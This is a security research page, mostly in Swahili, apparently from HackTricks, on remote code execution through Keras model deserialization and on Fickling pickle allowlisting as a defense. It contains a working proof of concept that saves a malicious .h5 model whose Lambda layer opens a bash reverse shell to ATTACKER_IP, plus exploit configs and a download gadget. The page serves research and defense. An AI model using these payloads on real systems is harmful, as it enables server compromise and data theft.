# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa practical exploitation techniques dhidi ya Keras model deserialization pipeline, unaeleza native .keras format internals na attack surface, na unatoa toolkit kwa watafiti kwa ajili ya kutafuta Model File Vulnerabilities (MFVs) na post-fix gadgets.

## .keras model format internals

Faili la .keras ni archive ya ZIP inayojumuisha angalau:
- metadata.json – taarifa za jumla (mf., Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights katika HDF5

config.json inaendesha recursive deserialization: Keras imports modules, resolves classes/functions na reconstructs layers/objects kutoka kwa attacker-controlled dictionaries.

Mfano wa kipande cha msimbo kwa Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization hufanya:
- Ku-import kwa module na utatuzi wa symbol kutoka kwa module/class_name keys
- from_config(...) au invocation ya constructor na attacker-controlled kwargs
- Recursion ndani ya nested objects (activations, initializers, constraints, etc.)

Kihistoria, hili lilifunua primitives tatu kwa attacker anayefanya config.json:
- Udhibiti wa ni modules gani zinazoimportiwa
- Udhibiti wa ni classes/functions gani zitakazotatuliwa
- Udhibiti wa kwargs zinazopitishwa kwa constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Sababu ya mzizi:
- Lambda.from_config() ilitumia python_utils.func_load(...) ambayo hufanya base64-decode na kuita marshal.loads() kwenye attacker bytes; Python unmarshalling inaweza kutekeleza code.

Wazo la exploit (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras huweka safe_mode=True kwa chaguo-msingi. Funsi za Python zilizohifadhiwa (serialized) katika Lambda zinazuia, isipokuwa mtumiaji ataondoa ulinzi wazi kwa safe_mode=False.

Notes:
- Miundo ya zamani (hifadhi za HDF5 za zamani) au codebases za zamani huenda hazitekelezi ukaguzi wa kisasa, hivyo mashambulizi ya mtindo wa “downgrade” bado yanaweza kutumika wakati wahanga wanapotumia loaders za zamani.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn ilitumia importlib.import_module() bila vikwazo na module strings zilizodhibitiwa na attacker kutoka config.json.
- Impact: Kuagizwa bila vizuizi (arbitrary import) ya module yoyote iliyosakinishwa (au module iliyowekwa na attacker kwenye sys.path). Code ya wakati wa import itaendeshwa, kisha ujenzi wa object utatokea ukiwa na attacker kwargs.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Marekebisho ya usalama (Keras ≥ 3.9):
- Orodha ya kuruhusu modules: imports zimezuiwa kwa modules rasmi za ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True inazuia loading ya serialized-function za Lambda zisizo salama
- Ukaguzi wa aina wa msingi: deserialized objects lazima ziendane na aina zinazotarajiwa

## Utekelezaji wa vitendo: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Mifumo mingi ya uzalishaji bado inakubali faili za modeli za zamani za TensorFlow-Keras HDF5 (.h5). Ikiwa mdukuzi anaweza kupakia modeli ambayo seva baadaye inaiweka au kuendesha inference juu yake, layer ya Lambda inaweza kutekeleza Python yoyote wakati wa load/build/predict.

PoC ndogo ya kutengeneza .h5 hasidi ambayo inatekeleza reverse shell wakati inatengenezwa tena (deserialized) au inapotumika:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Vidokezo na ushauri wa uaminifu:
- Mambo yanayochochea: code inaweza kukimbia mara nyingi (kwa mfano, wakati wa layer build/first call, model.load_model, na predict/fit). Fanya payloads idempotent.
- Kuweka toleo (version pinning): linganisha TF/Keras/Python ya mwathiriwa ili kuepuka kutofautiana kwa serialization. Kwa mfano, jenga artifakti chini ya Python 3.8 na TensorFlow 2.13.1 ikiwa ndio lengo linavyotumika.
- Kuiga mazingira kwa haraka:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Uthibitisho: payload isiyo hatari kama os.system("ping -c 1 YOUR_IP") husaidia kuthibitisha utekelezaji (kwa mfano, angalia ICMP kwa tcpdump) kabla ya kubadilisha kwenda reverse shell.

## Uso wa gadget baada ya marekebisho ndani ya allowlist

Hata kwa allowlisting na safe mode, uso mpana unabaki miongoni mwa callables za Keras zilizoruhusiwa. Kwa mfano, keras.utils.get_file inaweza kupakua URL yoyote hadi maeneo yanayoweza kuchaguliwa na mtumiaji.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Kizuizi muhimu:
- Lambda.call() inaweka input tensor kama hoja ya kwanza ya nafasi wakati inapoita callable lengwa. Chosen gadgets lazima zivumilie hoja ya nafasi ya ziada (au zikubali *args/**kwargs). Hii inazuia ni function zipi zinaweza kutumika.

## ML pickle import allowlisting for AI/ML models (Fickling)

Mifumo mingi ya modeli za AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, artifacts za zamani za TensorFlow, nk.) huingiza data za Python pickle. Wavamizi kwa kawaida wanatumia kwa mabaya imports za pickle GLOBAL na constructors za object ili kufikia RCE au kubadilisha modeli wakati wa load. Skana za blacklist mara nyingi hazitambui imports hatarishi mpya au zisizoorodheshwa.

Ulinzi wa vitendo wa aina fail-closed ni ku-hook deserializer ya Python pickle na kuruhusu tu seti iliyopitiwa ya imports zinazohusiana na ML ambazo hazina hatari wakati wa unpickling. Trail of Bits’ Fickling inatekeleza sera hii na inasafirisha curated ML import allowlist iliyojengwa kutoka kwa maelfu ya pickles za umma za Hugging Face.

Mfumo wa usalama kwa imports “salama” (intuitions zilizochambuliwa kutoka utafiti na uzoefu): symbols zilizoimport-wa zinazotumiwa na pickle lazima kwa wakati mmoja:
- Zisitekeleze code au kusababisha utekelezaji (hakuna compiled/source code objects, shelling out, hooks, n.k.)
- Zisipate/zisibadilishe attributes au items bila vizuizi
- Zisiiingize wala zipate references kwa vitu vingine vya Python kutoka kwa pickle VM
- Zisizindue deserializers za pili (mf., marshal, nested pickle), hata kwa njia isiyo ya moja kwa moja

Washa ulinzi wa Fickling mapema iwezekanavyo katika kuanzishwa kwa process ili load yoyote ya pickle inayofanywa na frameworks (torch.load, joblib.load, nk.) ichekwe:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Vidokezo vya uendeshaji:
- Unaweza kuzima kwa muda au kuwasha tena hooks pale vinapohitajika:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ikiwa modeli iliyojulikana kuwa salama imezuiwa, panua allowlist kwa mazingira yako baada ya kupitia alama:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling pia hutoa generic runtime guards ikiwa unapendelea udhibiti wa granular zaidi:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Pendelea model formats zisizo za pickle inapowezekana (mfano, SafeTensors). Ikiwa lazima ukubali pickle, endesha loaders kwa least privilege bila network egress na utekeleze allowlist.

Stratijia ya allowlist-first inaonyesha wazi kuwa inazuia njia za kawaida za ML pickle exploit huku ikidumisha ulinganifu wa juu. Katika benchmark ya ToB, Fickling iliweka alama 100% ya faili za synthetic zenye madhara na ikaruhusu ~99% ya faili safi kutoka repos maarufu za Hugging Face.


## Vifaa vya Mtafiti

1) Systematic gadget discovery in allowed modules

Taja candidate callables katika keras, keras_nlp, keras_cv, keras_hub na upangilie kipaumbele zile zenye side effects kwa file/network/process/env.

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Majaribio ya moja kwa moja ya deserialization (no .keras archive needed)

Weka dicts zilizotengenezwa moja kwa moja ndani ya Keras deserializers ili kujifunza params zinazokubaliwa na kuona athari za pembeni.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Kupima miongoni mwa matoleo na fomati

Keras inapatikana katika codebases/eras mbalimbali zenye mipaka ya usalama na fomati tofauti:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Rudia majaribio katika codebases na fomati tofauti (.keras vs legacy HDF5) ili kugundua regressions au ukosefu wa vikwazo.

## Marejeo

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
